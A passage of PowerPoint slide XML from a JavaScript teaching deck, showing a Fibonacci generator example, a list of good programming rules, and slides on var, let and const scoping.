                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{381996E2-798F-4BDE-A2AF-16C5B13723D8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1370012"/>
            <a:ext cx="10972800" cy="5213350"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>fibGenerator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() {</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current</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</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next</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>1</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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>while</a:t>
            </a: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true</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</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next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current</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next</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>current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next</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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>yield</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current</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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>     }</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fib</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>fibGenerator</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r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>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 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>let</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i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</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i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> &lt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>20</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i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>++) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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fib</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next</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value</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3E1FF37-5A58-4D3B-BD72-49C9B772F1A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Good Programming Rules</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{479529A3-EA58-4884-BC9D-DB1101C47FDF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4983162"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Keep It Simple Stupid (K.I.S.S.)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Ideally each function and part of code does just one thing: input or output or logic. Don't mix algorithmic logic with input/output.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Don't Repeat Yourself (DRY) or Rule of Three (copy paste same code once, but not to three locations)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Don't fall for Not Invented Here (NIH) and reinventing the wheel. Instead use well-proven and well-documented libraries!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>90 % of your time will be spent 10 % of your code (Ninety-Ninety Rule)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>P</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>remature optimization is the root of all evil.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Write and document your code for others (if you are programming alone).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Be consistent in your naming and style.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2505650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F354D6C-DA4E-43BF-8DD3-DE4B31089CE8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript Scopes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Sisällön paikkamerkki 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EDD107FC-D8CA-44D5-92EE-90DBB739CB81}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph sz="half" idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2228494113"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1600200"/>
          <a:ext cx="5384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isällön paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DC1A9BE3-168B-4BF2-B431-CB88EA67877B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Any variable defined inside a function without var/let/const is global. All variables defined at top-level at global.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>var definitions spill over from inner block scope to outer block</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>const and let declarations stay in inner block</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32071200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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F88E1397-5655-4DBF-B887-FD2DF9ECA711}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Old Style Variable Declaration</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{39973BC7-F987-4988-BA80-E524DD4C8527}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="407988" y="1600200"/>
            <a:ext cx="11088687" cy="4972050"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Outside any function or variable is always global</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var a = "cat"; // is global</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>b = "dog"; // is also global, not recommended</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Inside a function without var is global</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function f() {</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  x = 5; // x is global, if x not found, makes new</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  //...</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Inside a function using var is local</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function f() {</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  var y = 0; // y is local</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  //...</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New"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8F07BC96-AA0A-4A72-BA23-6B75DDFE667E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>ES6 Scoping Declarations</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62467" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E93DD581-586A-4055-90B4-088108670BC6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>let </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>allows to declare block scope (highly recommended instead </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400"/>
              <a:t>of var!)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for(let </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=1; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;=100; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>++) {</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>console.log(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>); // will fail, because </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
